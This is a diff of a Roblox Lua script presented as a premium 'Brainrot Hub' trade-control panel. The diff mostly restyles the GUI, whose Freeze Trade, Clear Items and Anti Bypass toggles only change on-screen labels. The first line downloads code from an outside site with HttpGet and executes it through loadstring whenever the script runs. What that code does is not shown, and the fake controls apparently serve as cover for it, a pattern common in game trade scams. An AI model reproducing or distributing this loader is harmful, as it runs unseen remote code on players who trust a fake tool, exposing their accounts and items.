@@ -1,57 +1,98 @@
 loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
+--================================================
+-- XI SCRIPTS | BRAINROT TRADE CONTROL
+-- Premium UI Edition
+--================================================
+
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
 
 local gui = Instance.new("ScreenGui")
-gui.Name = "XiScriptsTradeControl"
+gui.Name = "XiScriptsPremium"
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
+local function corner(obj, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius)
+    c.Parent = obj
+end
+
+local function stroke(obj, color, thickness)
+    local s = Instance.new("UIStroke")
+    s.Color = color
+    s.Thickness = thickness or 1
+    s.Parent = obj
+    return s
+end
+
 -- MAIN WINDOW
 local main = Instance.new("Frame")
-main.Name = "Main"
-main.Size = UDim2.fromOffset(225, 205)
-main.Position = UDim2.new(0.5, -112, 0.5, -102)
-main.BackgroundColor3 = Color3.fromRGB(22, 22, 29)
+main.Size = UDim2.fromOffset(265, 250)
+main.Position = UDim2.new(0.5, -132, 0.5, -125)
+main.BackgroundColor3 = Color3.fromRGB(24, 15, 39)
 main.BorderSizePixel = 0
 main.Active = true
 main.Parent = gui
+corner(main, 14)
+stroke(main, Color3.fromRGB(160, 75, 255), 2)
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 9)
-corner.Parent = main
+-- TOP HEADER
+local header = Instance.new("Frame")
+header.Size = UDim2.new(1, 0, 0, 62)
+header.BackgroundColor3 = Color3.fromRGB(53, 26, 83)
+header.BorderSizePixel = 0
+header.Parent = main
+corner(header, 14)
 
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(85, 85, 110)
-stroke.Thickness = 1
-stroke.Parent = main
-
--- TITLE BAR
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 35)
-title.BackgroundColor3 = Color3.fromRGB(32, 32, 43)
-title.Text = "  XI TRADE CONTROL"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.TextSize = 13
-title.Font = Enum.Font.GothamBold
+title.Size = UDim2.new(1, -55, 0, 28)
+title.Position = UDim2.fromOffset(13, 7)
+title.BackgroundTransparency = 1
+title.Text = "🧠 BRAINROT HUB"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 17
+title.Font = Enum.Font.GothamBlack
 title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = main
+title.Parent = header
 
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 9)
-titleCorner.Parent = title
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -20, 0, 16)
+subtitle.Position = UDim2.fromOffset(14, 36)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "XI SCRIPTS  •  TRADE CONTROL"
+subtitle.TextColor3 = Color3.fromRGB(195, 155, 255)
+subtitle.TextSize = 9
+subtitle.Font = Enum.Font.GothamBold
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = header
 
--- DRAGGABLE WINDOW
+-- RAINBOW ACCENT
+local accent = Instance.new("Frame")
+accent.Size = UDim2.new(1, 0, 0, 3)
+accent.Position = UDim2.fromOffset(0, 61)
+accent.BorderSizePixel = 0
+accent.Parent = main
+
+task.spawn(function()
+    local hue = 0
+    while gui.Parent do
+        hue = (hue + 0.005) % 1
+        accent.BackgroundColor3 = Color3.fromHSV(hue, 0.8, 1)
+        task.wait(0.03)
+    end
+end)
+
+-- DRAGGING
 local dragging = false
-local dragStart
-local startPos
+local dragStart, startPos
 
-title.InputBegan:Connect(function(input)
+header.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1
     or input.UserInputType == Enum.UserInputType.Touch then
-
         dragging = true
         dragStart = input.Position
         startPos = main.Position
@@ -63,9 +104,7 @@ UIS.InputChanged:Connect(function(input)
         input.UserInputType == Enum.UserInputType.MouseMovement
         or input.UserInputType == Enum.UserInputType.Touch
     ) then
-
         local delta = input.Position - dragStart
-
         main.Position = UDim2.new(
             startPos.X.Scale,
             startPos.X.Offset + delta.X,
@@ -82,38 +121,66 @@ UIS.InputEnded:Connect(function(input)
     end
 end)
 
--- TOGGLE STATES
+-- MINIMIZE
+local minimized = false
+
+local mini = Instance.new("TextButton")
+mini.Size = UDim2.fromOffset(27, 27)
+mini.Position = UDim2.new(1, -36, 0, 9)
+mini.BackgroundColor3 = Color3.fromRGB(115, 60, 170)
+mini.Text = "−"
+mini.TextColor3 = Color3.new(1, 1, 1)
+mini.TextSize = 19
+mini.Font = Enum.Font.GothamBold
+mini.Parent = header
+corner(mini, 8)
+
+-- CONTROLS
 local states = {
     ["Freeze Trade"] = false,
     ["Clear Items"] = false,
     ["Anti Bypass"] = false
 }
 
-local function createToggle(name, y)
+local function createToggle(name, icon, y)
+
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1, -20, 0, 43)
+    row.Position = UDim2.fromOffset(10, y)
+    row.BackgroundColor3 = Color3.fromRGB(40, 29, 57)
+    row.BorderSizePixel = 0
+    row.Parent = main
+    corner(row, 9)
+    stroke(row, Color3.fromRGB(85, 57, 115), 1)
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -90, 1, 0)
+    label.Position = UDim2.fromOffset(10, 0)
+    label.BackgroundTransparency = 1
+    label.Text = icon .. "  " .. name
+    label.TextColor3 = Color3.fromRGB(245, 235, 255)
+    label.TextSize = 12
+    label.Font = Enum.Font.GothamBold
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = row
 
     local button = Instance.new("TextButton")
-    button.Name = name
-    button.Size = UDim2.new(1, -20, 0, 34)
-    button.Position = UDim2.fromOffset(10, y)
-    button.BackgroundColor3 = Color3.fromRGB(42, 42, 53)
+    button.Size = UDim2.fromOffset(57, 27)
+    button.Position = UDim2.new(1, -65, 0.5, -13)
     button.BorderSizePixel = 0
-    button.Font = Enum.Font.GothamSemibold
-    button.TextSize = 12
-    button.Parent = main
-
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0, 6)
-    buttonCorner.Parent = button
+    button.Font = Enum.Font.GothamBlack
+    button.TextSize = 10
+    button.Parent = row
+    corner(button, 7)
 
     local function update()
         local enabled = states[name]
 
-        button.Text = name .. "     " ..
-            (enabled and "ON" or "OFF")
-
-        button.TextColor3 = enabled
-            and Color3.fromRGB(90, 255, 135)
-            or Color3.fromRGB(255, 100, 100)
+        button.Text = enabled and "ON" or "OFF"
+        button.BackgroundColor3 = enabled
+            and Color3.fromRGB(44, 190, 103)
+            or Color3.fromRGB(110, 53, 72)
+        button.TextColor3 = Color3.new(1, 1, 1)
     end
 
     button.MouseButton1Click:Connect(function()
@@ -124,32 +191,45 @@ local function createToggle(name, y)
     update()
 end
 
--- CREATE CONTROLS
-createToggle("Freeze Trade", 45)
-createToggle("Clear Items", 84)
-createToggle("Anti Bypass", 123)
-
--- FOOTER
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, 0, 0, 16)
-footer.Position = UDim2.fromOffset(0, 163)
-footer.BackgroundTransparency = 1
-footer.Text = "Xi Script Premium"
-footer.TextColor3 = Color3.fromRGB(145, 145, 160)
-footer.TextSize = 9
-footer.Font = Enum.Font.Gotham
-footer.Parent = main
+createToggle("Freeze Trade", "❄️", 75)
+createToggle("Clear Items", "🗑️", 124)
+createToggle("Anti Bypass", "🛡️", 173)
 
 -- WATERMARK
 local watermark = Instance.new("TextLabel")
-watermark.Name = "Watermark"
-watermark.Size = UDim2.new(1, 0, 0, 18)
-watermark.Position = UDim2.fromOffset(0, 183)
+watermark.Size = UDim2.new(1, 0, 0, 20)
+watermark.Position = UDim2.fromOffset(0, 224)
 watermark.BackgroundTransparency = 1
-watermark.Text = "@XiScripts"
-watermark.TextColor3 = Color3.fromRGB(150, 150, 190)
+watermark.Text = "✦ @XiScripts ✦"
+watermark.TextColor3 = Color3.fromRGB(190, 135, 255)
 watermark.TextSize = 10
-watermark.Font = Enum.Font.GothamBold
+watermark.Font = Enum.Font.GothamBlack
 watermark.Parent = main
 
-print("[XiScripts] Visual Trade Control Loaded!")
+-- MINIMIZE / RESTORE
+local reopen = Instance.new("TextButton")
+reopen.Size = UDim2.fromOffset(105, 38)
+reopen.Position = UDim2.new(0, 15, 0.5, 0)
+reopen.BackgroundColor3 = Color3.fromRGB(65, 35, 100)
+reopen.Text = "🧠 XI HUB"
+reopen.TextColor3 = Color3.new(1, 1, 1)
+reopen.TextSize = 12
+reopen.Font = Enum.Font.GothamBlack
+reopen.Visible = false
+reopen.Parent = gui
+corner(reopen, 10)
+stroke(reopen, Color3.fromRGB(170, 100, 255), 1)
+
+mini.MouseButton1Click:Connect(function()
+    minimized = true
+    main.Visible = false
+    reopen.Visible = true
+end)
+
+reopen.MouseButton1Click:Connect(function()
+    minimized = false
+    main.Visible = true
+    reopen.Visible = false
+end)
+
+print("[XiScripts] Brainrot Hub Loaded!")
